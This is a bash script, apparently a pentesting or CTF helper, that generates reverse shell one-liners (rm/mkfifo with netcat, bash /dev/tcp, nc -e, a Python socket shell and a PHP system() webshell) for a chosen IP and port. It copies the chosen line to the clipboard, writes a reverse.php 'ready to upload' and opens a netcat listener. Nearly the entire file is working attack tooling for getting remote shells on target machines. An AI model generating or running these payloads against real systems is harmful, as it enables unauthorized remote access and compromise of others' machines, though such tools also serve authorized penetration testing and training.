#!/bin/bash


#Definition of colours to make the display beautiful:)


boring="\e[0m" #no colour
red="\e[1;31m"
green="\e[1;32m"
blue="\e[1;34m"
hackergreen="\e[0;32m" #dark green
purple="\e[1;35m"


#Configuration of the reverse shell


echo -ne "${blue}Listening Port:${boring} " && read PORT

echo ""

echo -ne "${green}Those are your IP addresses:${purple}\n"

echo ""

hostname -I

echo ""

echo -ne "${blue}Choose the IP address you want to use from above:${boring} "  && read IP

echo ""


#PentestMonkey Reverse Shell Options


echo -ne "${blue}Which type of reverse shell command line do you want to use? (rm, bash, nc, python, php or all):${boring} " && read reverse

rm="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"

bash="bash -i >& /dev/tcp/$IP/$PORT 0>&1"

nc="nc -e /bin/sh $IP $PORT"

python="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"

php='<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '$IP' '$PORT' >/tmp/f") ?>'


#Display of the reverse shell


clear

echo ""

if [ $reverse != "php" ] && [ $reverse != "all" ]; then
echo -ne "${green}This is your reverse shell command line!!${boring}\n"
fi

if [ $reverse = "all" ]; then
echo -ne "${green}Those are your reverse shells command lines${boring}\n"
fi

if [ $reverse = "php" ]; then
echo "php" > reverse.php | echo -ne "${red}The file reverse.php is ready to upload and located in ${green}" ; pwd
fi

echo ""

if [ "$reverse" = "all" ];then
echo -ne "\n${purple} [+] ${blue}rm ${boring}= ${green}$rm \n\n ${purple}[+] ${blue}bash = ${green}$bash ${purple} \n\n [+] ${blue}nc = ${green}$nc \n\n ${purple}[+] ${blue}python = ${green}$python \n\n ${purple}[+] ${blue}php = ${green}$php"
fi

if [ "$reverse" = "rm" ]; then
echo -ne $rm | xclip -sel clip | echo -ne "${red}$rm${boring}\n\n"
fi

if [ "$reverse" = "bash" ]; then
echo $bash | xclip -sel clip | echo -ne "${red}$bash${boring}\n\n"
fi

if [ "$reverse" = "nc" ]; then
echo $nc | xclip -sel clip | echo -ne "${red}$nc${boring}\n\n"
fi

if [ "$reverse" = "python" ]; then
echo $python | xclip -sel clip | echo -ne "${red}$python${boring}\n\n"
fi

if [ "$reverse" != "php" ] && [ "$reverse" != "all" ]; then
echo -ne "${green}We have copied it for you!!! Paste it wherever you want:)${boring}\n\n"
fi


#Display of the listener (netcat)


echo -ne "${hackergreen}Waiting to say I'm in...${boring}"

echo ""
echo ""

nc -lvnp $PORT
